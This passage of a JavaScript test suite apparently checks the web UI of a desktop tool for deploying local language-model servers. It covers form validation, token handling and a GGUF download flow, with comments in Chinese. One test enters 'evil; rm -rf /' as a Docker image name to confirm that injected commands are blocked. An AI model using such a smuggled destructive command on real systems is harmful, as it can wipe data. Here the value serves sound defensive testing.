    if (!post) return null;
    const parsed = JSON.parse(post.body);
    parsed.__url = post.url;
    parsed.__hasToken = !!window.API_TOKEN;
    return parsed;
  } catch (e) { return { __error: String((e && e.stack) || e) }; } })()`);
  if (dockerBody && dockerBody.__error) console.log("  [debug] dockerBody: " + dockerBody.__error);
  // 写操作要带 token（DESK-29）；没有它桌面端会 403，功能直接坏掉。
  // 页面由控制面提供时 API_TOKEN 是空串（没有本机 API 要保护），那时**不该**带。
  // 两种模式都要断言，否则这条测试只是在验证其中一个部署方式。
  const hadTok = !!dockerBody && dockerBody.__hasToken;
  const sentTok = !!dockerBody && String(dockerBody.__url || '').indexOf('token=') >= 0;
  check(hadTok
      ? "DESK-29 桌面端页面：写操作请求带上了 token"
      : "DESK-29 控制面页面：没有 token，因此不带 token 参数",
    !!dockerBody && hadTok === sentTok,
    JSON.stringify({ hasToken: hadTok, sentToken: sentTok, url: dockerBody && dockerBody.__url }));
  check("docker 请求体 image 正确", dockerBody && dockerBody.image === "vllm/vllm-openai:latest", dockerBody && dockerBody.image);
  check("docker 请求体 gpus 正确", dockerBody && dockerBody.gpus === "0,1", dockerBody && dockerBody.gpus);
  check("docker 请求体 volumes 解析正确（空格路径 + ro + 空行）",
    !!dockerBody && JSON.stringify(dockerBody.volumes) === JSON.stringify([
      { host: "/Users/me/My Models", container: "/models", ro: true },
      { host: "/Users/me/data", container: "/data", ro: false },
    ]), dockerBody && JSON.stringify(dockerBody.volumes));
  check("docker 请求体 extra_args 按行解析（保留带空格参数）",
    !!dockerBody && JSON.stringify(dockerBody.extra_args) === JSON.stringify(["--max-model-len", "65536", "--served-model-name My Model"]),
    dockerBody && JSON.stringify(dockerBody.extra_args));

  // 校验被搬进 dockerFields() 之后，必须仍然真的拦得住。
  const badImage = await run(`(async () => {
    document.getElementById('d-image').value = 'evil; rm -rf /';
    window.__CAP.length = 0;
    await createDeploy();
    return { posted: window.__CAP.some((c) => c.path === '/api/deployments' && c.method === 'POST'),
      log: document.getElementById('d-log').textContent };
  })()`);
  check("非法镜像名提交前被拦", badImage.posted === false && badImage.log.indexOf('镜像') >= 0, badImage.log.slice(0, 40));

  const tooManyVols = await run(`(async () => {
    document.getElementById('d-image').value = 'ok/image:1';
    document.getElementById('d-volumes').value = Array.from({ length: 9 }, (_, i) => '/h' + i + ':/c' + i).join(String.fromCharCode(10));
    window.__CAP.length = 0;
    await createDeploy();
    return { posted: window.__CAP.some((c) => c.path === '/api/deployments' && c.method === 'POST'),
      log: document.getElementById('d-log').textContent };
  })()`);
  check("数据卷超过 8 条提交前被拦", tooManyVols.posted === false && tooManyVols.log.indexOf('8 条') >= 0, tooManyVols.log.slice(0, 40));

  const tooManyArgs = await run(`(async () => {
    document.getElementById('d-volumes').value = '';
    document.getElementById('d-extra').value = Array.from({ length: 33 }, (_, i) => '--a' + i).join(String.fromCharCode(10));
    window.__CAP.length = 0;
    await createDeploy();
    return { posted: window.__CAP.some((c) => c.path === '/api/deployments' && c.method === 'POST'),
      log: document.getElementById('d-log').textContent };
  })()`);
  check("额外参数超过 32 项提交前被拦", tooManyArgs.posted === false && tooManyArgs.log.indexOf('32 项') >= 0, tooManyArgs.log.slice(0, 40));

  const nonAbsVol = await run(`(async () => {
    document.getElementById('d-extra').value = '';
    document.getElementById('d-volumes').value = 'relative:/x';
    window.__CAP.length = 0;
    await createDeploy();
    return { posted: window.__CAP.some((c) => c.path === '/api/deployments' && c.method === 'POST'),
      log: document.getElementById('d-log').textContent };
  })()`);
  check("数据卷非绝对路径提交前被拦", nonAbsVol.posted === false && nonAbsVol.log.indexOf('绝对路径') >= 0, nonAbsVol.log.slice(0, 40));

  const goodAgain = await run(`(async () => {
    document.getElementById('d-volumes').value = '';
    window.__CAP.length = 0;
    await createDeploy();
    return window.__CAP.some((c) => c.path === '/api/deployments' && c.method === 'POST');
  })()`);
  check("清理掉非法值之后又能提交（拦截没有卡死表单）", goodAgain === true);

  const nonDocker = await run(`(async () => {
    const sel = document.getElementById('d-backend');
    sel.value = 'ollama'; sel.dispatchEvent(new Event('change', { bubbles: true }));
    document.getElementById('d-port').value = '11434';
    window.__CAP.length = 0;
    await createDeploy();
    const post = window.__CAP.filter((c) => c.path === '/api/deployments' && c.method === 'POST')[0];
    return post ? JSON.parse(post.body) : null;
  })()`);
  check("非 docker 后端不塞 docker 字段",
    !!nonDocker && nonDocker.backend === "ollama" && !("image" in nonDocker) && !("volumes" in nonDocker) && !("gpus" in nonDocker) && !("extra_args" in nonDocker),
    nonDocker && JSON.stringify(Object.keys(nonDocker)));

  // --- parsing units -------------------------------------------------------
  const parsed = await run(`(() => {
    const v = parseVolumes(['/a/My Models:/models:ro', '', '/b:/c', 'relative:/x'].join(String.fromCharCode(10)));
    const e = parseExtraArgs(['--a', '', '  --b  ', ''].join(String.fromCharCode(10)));
    return { volumes: v.volumes, verrors: v.errors, args: e.args };
  })()`);
  check("parseVolumes 支持空格路径与 ro", JSON.stringify(parsed.volumes) === JSON.stringify([
    { host: "/a/My Models", container: "/models", ro: true },
    { host: "/b", container: "/c", ro: false },
  ]), JSON.stringify(parsed.volumes));
  check("parseVolumes 拒绝非绝对路径", parsed.verrors.length === 1, JSON.stringify(parsed.verrors));
  check("parseExtraArgs 去掉空行", JSON.stringify(parsed.args) === JSON.stringify(["--a", "--b"]), JSON.stringify(parsed.args));

  // --- F-07: incompatible models are not offered ---------------------------
  const models = await run(`(() => {
    fillDeployModels({ recommendations: [
      { id: 'good-model', name: 'Good Model', quantization: 'q4', fits: true, reason_key: 'recommended', source: {} },
      { id: 'bad-model', name: 'Bad Model', quantization: 'awq', fits: true, reason_key: 'backend-incompatible', source: {} }
    ] });
    return { count: document.getElementById('d-model').options.length, models: DEPLOY_MODELS.map((m) => m.id) };
  })()`);
  check("不兼容模型不出现在部署下拉", models.count === 1 && models.models.join(",") === "good-model", models.models.join(","));

  // --- F-06: polling keeps the selected instance ---------------------------
  const poll = await run(`(async () => {
    window.__DEPS = [
      { id: 'dep_1', model_path: 'm1', backend: 'llama.cpp', status: 'STARTING', endpoint: 'e1', health_endpoint: 'h1', log: [] },
      { id: 'dep_2', model_path: 'm2', backend: 'llama.cpp', status: 'STOPPED', endpoint: 'e2', health_endpoint: 'h2', log: [] }
    ];
    await refreshDeployments();
    const sel = document.getElementById('t-dep');
    sel.selectedIndex = 1; sel.dispatchEvent(new Event('change', { bubbles: true }));
    const picked = sel.value;
    const modelAfterPick = document.getElementById('t-model').value;
    await refreshDeployments();
    clearTimeout(window.__depPoll);
    return { picked, modelAfterPick, after: sel.value, modelAfterPoll: document.getElementById('t-model').value };
  })()`);
  check("轮询不重置 t-dep 选择", poll.picked === "dep_2" && poll.after === "dep_2", poll.picked + " -> " + poll.after);
  check("轮询不改写已选实例的 t-model", poll.modelAfterPick === "m2" && poll.modelAfterPoll === "m2", poll.modelAfterPick + " -> " + poll.modelAfterPoll);

  // --- F-10: invalid port / max tokens blocked before submit ---------------
  const port0 = await run(`(async () => {
    const sel = document.getElementById('d-backend'); sel.value = 'docker'; sel.dispatchEvent(new Event('change', { bubbles: true }));
    document.getElementById('d-port').value = '0';
    window.__CAP.length = 0;
    await createDeploy();
    return { posted: window.__CAP.some((c) => c.path === '/api/deployments' && c.method === 'POST'), log: document.getElementById('d-log').textContent };
  })()`);
  check("端口 0 提交前被拦", port0.posted === false && port0.log.indexOf("端口") >= 0, port0.log.slice(0, 40));

  const portNaN = await run(`(async () => {
    document.getElementById('d-port').value = 'abc';
    window.__CAP.length = 0;
    await createDeploy();
    return { posted: window.__CAP.some((c) => c.path === '/api/deployments' && c.method === 'POST') };
  })()`);
  check("非数字端口提交前被拦", portNaN.posted === false);

  const tmax = await run(`(async () => {
    document.getElementById('d-port').value = '8000';
    const sel = document.getElementById('t-dep');
    if (!sel.value && sel.options.length) sel.selectedIndex = 0;
    document.getElementById('t-max').value = 'abc';
    window.__CAP.length = 0;
    await runTest();
    return { posted: window.__CAP.some((c) => c.url.indexOf('/test') >= 0), out: document.getElementById('t-out').textContent };
  })()`);
  check("非法 Token 提交前被拦", tmax.posted === false && tmax.out.indexOf("Token") >= 0, tmax.out.slice(0, 40));

  // --- F-03: backend down resets status and hardware card ------------------
  const down = await run(`(async () => {
    document.getElementById('status-text').textContent = '正在检测…';
    document.getElementById('status-dot').className = 'dot';
    document.getElementById('hw-device').textContent = 'OLD DEVICE';
    document.getElementById('hw-budget').textContent = '999 GB';
    const of = window.fetch;
    window.fetch = function () { return Promise.reject(new Error('down')); };
    await refresh();
    window.fetch = of;
    return {
      statusText: document.getElementById('status-text').textContent,
      dot: document.getElementById('status-dot').className,
      device: document.getElementById('hw-device').textContent,
      budget: document.getElementById('hw-budget').textContent,
    };
  })()`);
  check("后端不可用时状态行不再停在「正在检测…」", down.statusText !== "正在检测…" && down.dot === "dot", down.statusText);
  check("后端不可用时硬件卡片被重置", down.device === "—" && down.budget === "—", down.device + " / " + down.budget);

  // --- F-04 / F-05: no unhandled rejections --------------------------------
  const health = await run(`(async () => {
    window.__DEPS = [{ id: 'dep_h', model_path: 'm', backend: 'llama.cpp', status: 'STOPPED', endpoint: 'e', health_endpoint: 'h', log: [] }];
    await refreshDeployments();
    const sel = document.getElementById('t-dep');
    if (!sel.value && sel.options.length) sel.selectedIndex = 0;
    const of = window.fetch;
    window.fetch = function () { return Promise.resolve({ ok: false, status: 500, json: () => Promise.reject(new Error('bad json')) }); };
    await healthCheck();
    const out500 = document.getElementById('t-out').textContent;
    const rej = [];
    const h = (e) => { rej.push(String(e.reason)); };
    window.addEventListener('unhandledrejection', h);
    window.fetch = function () { return Promise.reject(new Error('netdown')); };
    healthCheck();
    await new Promise((r) => setTimeout(r, 100));
    window.removeEventListener('unhandledrejection', h);
    window.fetch = of;
    return { out500, rej, outNet: document.getElementById('t-out').textContent };
  })()`);
  check("healthCheck 对 500 给出反馈", health.out500.indexOf("健康检查失败") >= 0, health.out500.slice(0, 40));
  check("healthCheck 网络失败不产生 unhandled rejection", health.rej.length === 0 && health.outNet.indexOf("健康检查失败") >= 0, health.rej.join(","));

  const start = await run(`(async () => {
    const of = window.fetch;
    const rej = [];
    const h = (e) => { rej.push(String(e.reason)); };
    window.addEventListener('unhandledrejection', h);
    window.fetch = function () { return Promise.reject(new Error('netdown')); };
    depStart('dep_1');
    await new Promise((r) => setTimeout(r, 100));
    window.removeEventListener('unhandledrejection', h);
    window.fetch = of;
    return { rej, log: document.getElementById('d-log').textContent };
  })()`);
  check("depStart 网络失败不产生 unhandled rejection 且有提示", start.rej.length === 0 && start.log.indexOf("启动失败") >= 0, start.rej.join(",") + " | " + start.log.slice(0, 30));

  // --- confidence + corrected device label (docs/probe-session-design.md §1/§6)
  const conf1 = await run(`(async () => {
    window.__REC = {
      hardware: { device_name: 'NVIDIA GeForce RTX 3060', uma: false, total_device_gb: 12, usable_vram_gb: 10 },
      normalized_profile: { architecture: 'x86_64', confidence: 'unverified' },
      hardware_source: 'client:browser', hardware_trusted: false, client_is_local: false,
      confidence: 'unverified', recommendations: [], hardware_warnings: []
    };
    await refresh();
    return {
      type: document.getElementById('hw-type').textContent,
      typeHTML: document.getElementById('hw-type').innerHTML,
      arch: document.getElementById('hw-arch').textContent,
      conf: document.getElementById('hw-confidence').textContent
    };
  })()`);
  check("设备行显示「独立显存 · 12 GB」而不是 unknown", conf1.type.indexOf("独立显存 · 12 GB") >= 0, conf1.type);
  check("查表值有「不对？改」入口", conf1.typeHTML.indexOf("不对？改") >= 0);
  check("CPU 架构单独一行", conf1.arch === "CPU 架构 · x86_64", conf1.arch);
  check("confidence=unverified 文案正确", conf1.conf === "按型号查表，未实测", conf1.conf);

  const conf2 = await run(`(async () => {
    window.__REC.confidence = 'disputed';
    await refresh();
    const el = document.getElementById('hw-confidence');
    return { conf: el.textContent, cls: el.className };
  })()`);
  check("confidence=disputed 用 warn 样式", conf2.conf === "与型号标称不符，请确认" && conf2.cls.indexOf("warn") >= 0, conf2.conf + " / " + conf2.cls);

  const conf3 = await run(`(async () => {
    window.__REC = {
      hardware: { device_name: 'Apple M5', uma: true, total_device_gb: 24, usable_vram_gb: 19.2 },
      normalized_profile: { architecture: 'unknown' },
      hardware_source: 'server', hardware_trusted: true, client_is_local: true,
      recommendations: [], hardware_warnings: []
    };
    await refresh();
    return {
      conf: document.getElementById('hw-confidence').textContent,
      confDisplay: document.getElementById('hw-confidence').style.display,
      arch: document.getElementById('hw-arch').style.display,
      type: document.getElementById('hw-type').textContent
    };
  })()`);
  check("confidence 缺失时优雅降级", conf3.conf === "" && conf3.confDisplay === "none", conf3.conf);
  check("architecture=unknown 不渲染", conf3.arch === "none");
  check("统一内存显示容量", conf3.type.indexOf("统一内存 · 24 GB") >= 0, conf3.type);

  // --- S1: deployment actions no longer splice the id into inline JS -------
  const s1 = await run(`(() => {
    window.__DEPS = [{ id: 'dep_x', model_path: 'm', backend: 'llama.cpp', status: 'STOPPED', endpoint: 'e', health_endpoint: 'h', log: [] }];
    return refreshDeployments().then(() => {
      const buttons = [...document.querySelectorAll('#d-list button')];
      return { n: buttons.length, actions: buttons.map((b) => b.getAttribute('data-dep-action')), inline: buttons.some((b) => b.hasAttribute('onclick')) };
    });
  })()`);
  check("部署操作走 data 属性而不是裸拼 onclick", s1.n === 4 && s1.inline === false && s1.actions.join(",") === "start,stop,logs,delete", s1.actions.join(","));


  // --- DESK-30:「刷新」必须真的刷新后端可用性 -------------------------------
  // 实际发生过的：用户按提示装完 llama.cpp，点「刷新并关闭」，下拉里仍然写着
  // 「本机未安装」。因为 CONFIG 只在 init() 里取过一次，refresh() 根本不碰它 ——
  // 按钮上写着「刷新」，刷的却不是用户刚改变的那样东西。
  const refreshBackends = await run(`(async () => {
    const savedFetch = window.fetch;
    const savedConfig = CONFIG;
    const savedLast = LAST;
    try {
      // 伪装成「装之前」
      CONFIG = { backends: ['ollama'], installable: {}, unavailable: {} };
      fillBackends();
      const before = document.querySelector('#d-backend option[value="llama.cpp"]');
      const beforeNeeds = !!(before && before.hasAttribute('data-needs-install'));
      // 装完了：服务端现在说 llama.cpp 可用。其余端点故意失败，让 refresh 跳过渲染。
      window.fetch = function (url) {
        if (String(url).indexOf('/api/backends') >= 0) {
          return Promise.resolve({ ok: true, status: 200, json: () => Promise.resolve({
            backends: ['ollama', 'llama.cpp', 'mlx', 'docker'], installable: {}, unavailable: {} }) });
        }
        return Promise.reject(new Error('not stubbed'));
      };
      await refresh();
      const after = document.querySelector('#d-backend option[value="llama.cpp"]');
      const afterNeeds = !!(after && after.hasAttribute('data-needs-install'));
      return { beforeNeeds: beforeNeeds, afterNeeds: afterNeeds };
    } finally {
      window.fetch = savedFetch;
      CONFIG = savedConfig;
      LAST = savedLast;
      fillBackends();
    }
  })()`);
  check("DESK-30 装之前 llama.cpp 标着未安装",
    refreshBackends.beforeNeeds === true, JSON.stringify(refreshBackends));
  check("DESK-30 刷新后 llama.cpp 不再标未安装（CONFIG 真的被重取）",
    refreshBackends.afterNeeds === false, JSON.stringify(refreshBackends));


  // --- DESK-31：创建流程的默认值与校验 ------------------------------------
  // 实际发生过的：目录把 HuggingFace 仓库 id 填成 llama.cpp 的模型路径，端口还留着
  // Ollama 的 11434，创建时什么都不查 —— 三个必然失败的部署就这么被建了出来。
  const b31 = await run(`(async () => {
    const out = {};
    const pathEl = document.getElementById('d-path');
    const portEl = document.getElementById('d-port');
    const beEl = document.getElementById('d-backend');
    const originEl = document.getElementById('d-origin');
    const modelEl = document.getElementById('d-model');
    const logEl = document.getElementById('d-log');
    // 这个探针会改 DEPLOY_MODELS / PATH_FROM_CATALOG / PORT_USER_SET 和四个表单
    // 控件。改完必须原样还原，否则后面的测试全被污染（DESK-28 的教训）。
    const saved = {
      models: DEPLOY_MODELS, path: PATH_FROM_CATALOG, port: PORT_USER_SET,
      modelHTML: modelEl.innerHTML, modelVal: modelEl.value,
      be: beEl.value, portVal: portEl.value, pathVal: pathEl.value,
      log: logEl.textContent, originHTML: originEl.innerHTML,
      originDisplay: originEl.style.display, originClass: originEl.className,
    };
    const catalog = { recommendations: [
      { id: 'qwen3-8b', name: 'Qwen3 8B', quantization: 'Q4_K_M', fits: true,
        reason_key: 'ok', recommended: true,
        source: { ollama: 'qwen3:8b', huggingface: 'Qwen/Qwen3-8B',
                  mlx: 'mlx-community/Qwen3-8B-4bit' } },
    ] };
    try {
      // 1) llama.cpp：仓库 id 不能当路径，端口不能是 Ollama 的
      PORT_USER_SET = false;
      fillDeployModels(catalog);
      beEl.value = 'llama.cpp';
      syncDeploy();
      out.llamaPath = pathEl.value;
      out.llamaPort = portEl.value;
      out.llamaHint = originEl.textContent;
      out.llamaWarn = originEl.className.indexOf('warn') >= 0;

      // 2) mlx：仓库 id 在这里是对的，而且要用 mlx-community 那一份
      PORT_USER_SET = false;
      beEl.value = 'mlx';
      syncDeploy();
      out.mlxPath = pathEl.value;
      out.mlxPort = portEl.value;

      // 3) docker：仓库 id 同样是对的
      PORT_USER_SET = false;
      beEl.value = 'docker';
      syncDeploy();
      out.dockerPath = pathEl.value;

      // 4) 用户自己设过端口，就不该被后端默认值覆盖
      PORT_USER_SET = false;
      beEl.value = 'ollama';
      syncDeploy();
      portEl.value = '7777';
      portEl.dispatchEvent(new Event('change', { bubbles: true }));
      beEl.value = 'llama.cpp';
      syncDeploy();
      out.keptPort = portEl.value;

      // 5) createDeploy 在发请求之前就拦住仓库 id
      pathEl.value = 'Qwen/Qwen3-8B';
      let posted = false;
      const sf = window.fetch;
      window.fetch = function () { posted = true; return Promise.reject(new Error('不该走到这里')); };
      await createDeploy();
      window.fetch = sf;
      out.repoPosted = posted;
      out.repoMsg = logEl.textContent;
      return out;
    } finally {
      DEPLOY_MODELS = saved.models; PATH_FROM_CATALOG = saved.path; PORT_USER_SET = saved.port;
      modelEl.innerHTML = saved.modelHTML; modelEl.value = saved.modelVal;
      beEl.value = saved.be; portEl.value = saved.portVal; pathEl.value = saved.pathVal;
      logEl.textContent = saved.log; originEl.innerHTML = saved.originHTML;
      originEl.style.display = saved.originDisplay; originEl.className = saved.originClass;
    }
  })()`);
  check("DESK-31 llama.cpp 不拿 HuggingFace 仓库 id 当模型路径",
    b31.llamaPath === '', JSON.stringify(b31.llamaPath));
  check("DESK-31 llama.cpp 的端口不是 Ollama 的 11434",
    b31.llamaPort === '8080', b31.llamaPort);
  check("DESK-31 llama.cpp 说清只加载本机 .gguf 且用 warn 样式",
    b31.llamaHint.indexOf('.gguf') >= 0 && b31.llamaWarn === true, b31.llamaHint);
  check("DESK-31 mlx 用 mlx-community 那份权重",
    b31.mlxPath === 'mlx-community/Qwen3-8B-4bit', b31.mlxPath);
  check("DESK-31 docker 仍然用 HuggingFace 仓库 id",
    b31.dockerPath === 'Qwen/Qwen3-8B', b31.dockerPath);
  check("DESK-31 用户自己设的端口不被覆盖",
    b31.keptPort === '7777', b31.keptPort);
  check("DESK-31 createDeploy 在发请求前拦住仓库 id",
    b31.repoPosted === false && b31.repoMsg.indexOf('HuggingFace') >= 0,
    JSON.stringify({ posted: b31.repoPosted, msg: b31.repoMsg }));


  // --- DESK-32：一键下载并部署（页面侧）-----------------------------------
  // 用户的原话是「还是太不方便了 我需要自动化 傻瓜式的」。告诉缺什么还不够，
  // 得有一条点下去的出路。真正的网络集成在 test-server.js 里测；这里只验证
  // 页面把这条路挂上去了、并且说什么。
  const b32 = await run(`(async () => {
    const out = {};
    const pathEl = document.getElementById('d-path');
    const beEl = document.getElementById('d-backend');
    const originEl = document.getElementById('d-origin');
    const modelEl = document.getElementById('d-model');
    const saved = {
      models: DEPLOY_MODELS, path: PATH_FROM_CATALOG, port: PORT_USER_SET,
      modelHTML: modelEl.innerHTML, modelVal: modelEl.value,
      be: beEl.value, pathVal: pathEl.value,
      originHTML: originEl.innerHTML, originDisplay: originEl.style.display,
      originClass: originEl.className, modal: document.getElementById('modal').style.display,
      ggufPlan: window.__GGUF_PLAN, config: CONFIG,
    };
    try {
      CONFIG = Object.assign({}, CONFIG, { local: true });
      const withRepo = { recommendations: [
        { id: 'qwen3-8b', name: 'Qwen3 8B', quantization: 'Q4_K_M', fits: true,
          reason_key: 'ok', recommended: true,
          source: { ollama: 'qwen3:8b', huggingface: 'Qwen/Qwen3-8B',
                    mlx: 'mlx-community/Qwen3-8B-4bit', gguf: 'Qwen/Qwen3-8B-GGUF' } },
      ] };
      const noRepo = { recommendations: [
        { id: 'custom-thing', name: '没有仓库的模型', quantization: 'Q4_K_M', fits: true,
          reason_key: 'ok', source: { huggingface: 'x/y' } },
      ] };

      // 1) 目录没给 GGUF 仓库时，不能拿一个坏按钮骗人
      PORT_USER_SET = false;
      fillDeployModels(noRepo);
      beEl.value = 'llama.cpp';
      syncDeploy();
      out.noRepoHint = originEl.textContent;
      out.noRepoBtn = !!originEl.querySelector('[data-act=\"autoGguf\"]');

      // 2) 有仓库时，llama.cpp 的提示里必须挂上一键按钮，且点名仓库
      PORT_USER_SET = false;
      fillDeployModels(withRepo);
      beEl.value = 'llama.cpp';
      syncDeploy();
      out.hasBtn = !!originEl.querySelector('[data-act=\"autoGguf\"]');
      out.hintRepo = originEl.textContent;

      // 3) 换成 mlx 就不该有它 —— 那个后端本来就自己下载
      beEl.value = 'mlx';
      syncDeploy();
      out.mlxBtn = !!originEl.querySelector('[data-act=\"autoGguf\"]');

      // 3b) 控制面直连的页面没有下载端点，给按钮就是给一个按不动的东西
      beEl.value = 'llama.cpp';
      CONFIG = Object.assign({}, CONFIG, { local: false });
      syncDeploy();
      out.remoteBtn = !!originEl.querySelector('[data-act=\"autoGguf\"]');
      out.remoteHint = originEl.textContent;
      CONFIG = Object.assign({}, CONFIG, { local: true });

      // 4) 还没下载：给出仓库、文件、大小，等确认；这一步不能碰模型路径
      beEl.value = 'llama.cpp';
      syncDeploy();
      window.__GGUF_PLAN = { repo: 'Qwen/Qwen3-8B-GGUF', quant: 'q4_k_m',
        bytes: 5027783488, needs_download: true,
        model_path: '/Users/me/.mdp-models/Qwen--Qwen3-8B-GGUF/Qwen3-8B-Q4_K_M.gguf',
        files: [{ name: 'Qwen3-8B-Q4_K_M.gguf', size: 5027783488 }] };
      await autoGguf();
      const body = document.getElementById('m-body');
      const actions = document.getElementById('m-actions');
      out.modalShown = document.getElementById('modal').style.display;
      out.planText = body.textContent;
      out.confirm = !!actions.querySelector('[data-act=\"ggufGo\"]');
      out.pathBeforeConfirm = pathEl.value;

      // 5) 已经下载过：不必再问一遍，直接填好并给出「创建并启动」
      window.__GGUF_PLAN = { repo: 'Qwen/Qwen3-8B-GGUF', quant: 'q4_k_m',
        bytes: 5027783488, needs_download: false,
        model_path: '/Users/me/.mdp-models/Qwen--Qwen3-8B-GGUF/Qwen3-8B-Q4_K_M.gguf',
        files: [{ name: 'Qwen3-8B-Q4_K_M.gguf', size: 5027783488 }] };
      await autoGguf();
      out.alreadyText = document.getElementById('m-body').textContent;
      out.alreadyPath = pathEl.value;
      out.alreadyDeploy = !!document.getElementById('m-actions').querySelector('[data-act=\"ggufDeploy\"]');

      // 6) 查询失败要说明白，而不是留一个空对话框
      window.__GGUF_PLAN = { detail: '仓库 Qwen/nope 不存在' };
      window.__GGUF_PLAN_OK = false;
      window.__GGUF_PLAN_STATUS = 400;
      await autoGguf();
      out.badText = document.getElementById('m-body').textContent;
      out.badHasConfirm = !!document.getElementById('m-actions').querySelector('[data-act=\"ggufGo\"]');
      out.hb = humanBytes(4.68 * 1024 * 1024 * 1024) + ' / ' + humanBytes(0);
      return out;
    } finally {
      closeModal();
      CONFIG = saved.config;
      window.__GGUF_PLAN = saved.ggufPlan;
      delete window.__GGUF_PLAN_OK; delete window.__GGUF_PLAN_STATUS;
      DEPLOY_MODELS = saved.models; PATH_FROM_CATALOG = saved.path; PORT_USER_SET = saved.port;
      modelEl.innerHTML = saved.modelHTML; modelEl.value = saved.modelVal;
      beEl.value = saved.be; pathEl.value = saved.pathVal;
      originEl.innerHTML = saved.originHTML; originEl.style.display = saved.originDisplay;
      originEl.className = saved.originClass;
      document.getElementById('modal').style.display = saved.modal;
    }
  })()`);
  check("DESK-32 没有 GGUF 仓库的模型不显示下载按钮，并说清原因",
    b32.noRepoBtn === false && b32.noRepoHint.indexOf('GGUF') >= 0,
    JSON.stringify({ btn: b32.noRepoBtn, hint: b32.noRepoHint }));
  check("DESK-32 llama.cpp 的提示里挂上了一键下载按钮", b32.hasBtn === true, String(b32.hasBtn));
  check("DESK-32 按钮旁点名了 GGUF 仓库",
    b32.hintRepo.indexOf('Qwen/Qwen3-8B-GGUF') >= 0, b32.hintRepo);
  check("DESK-32 mlx 不显示这个按钮（它自己会下载）", b32.mlxBtn === false, String(b32.mlxBtn));
  check("DESK-32 控制面直连时不显示这个按钮，并指向桌面端",
    b32.remoteBtn === false && b32.remoteHint.indexOf('桌面端') >= 0,
    JSON.stringify({ btn: b32.remoteBtn, hint: b32.remoteHint }));
  check("DESK-32 对话框说清仓库、文件、大小",
    b32.planText.indexOf('Qwen/Qwen3-8B-GGUF') >= 0 &&
    b32.planText.indexOf('Qwen3-8B-Q4_K_M.gguf') >= 0 &&
    b32.planText.indexOf('4.68 GB') >= 0, b32.planText);
  check("DESK-32 下载前只给「确认下载」，不直接开始", b32.confirm === true, String(b32.confirm));
  check("DESK-32 没确认之前不动模型路径", b32.pathBeforeConfirm === '',
    JSON.stringify(b32.pathBeforeConfirm));
  check("DESK-32 已下载过就不再问，直接填好路径",
    b32.alreadyPath.indexOf('Qwen3-8B-Q4_K_M.gguf') >= 0 &&
    b32.alreadyText.indexOf('已经有') >= 0, JSON.stringify(b32.alreadyPath));
  check("DESK-32 已下载过时给的是「创建并启动」", b32.alreadyDeploy === true, String(b32.alreadyDeploy));
  check("DESK-32 查不到时说清楚，且不给确认按钮",
    b32.badText.indexOf('拿不到') >= 0 && b32.badHasConfirm === false,
    b32.badText);
  check("DESK-32 humanBytes 好读", b32.hb === '4.68 GB / 未知大小', String(b32.hb));
  console.log("\n" + pass + " passed, " + fail + " failed");
  app.exit(fail ? 1 : 0);
}).catch((e) => { console.error("FAILED:", e && e.stack || e); app.exit(1); });
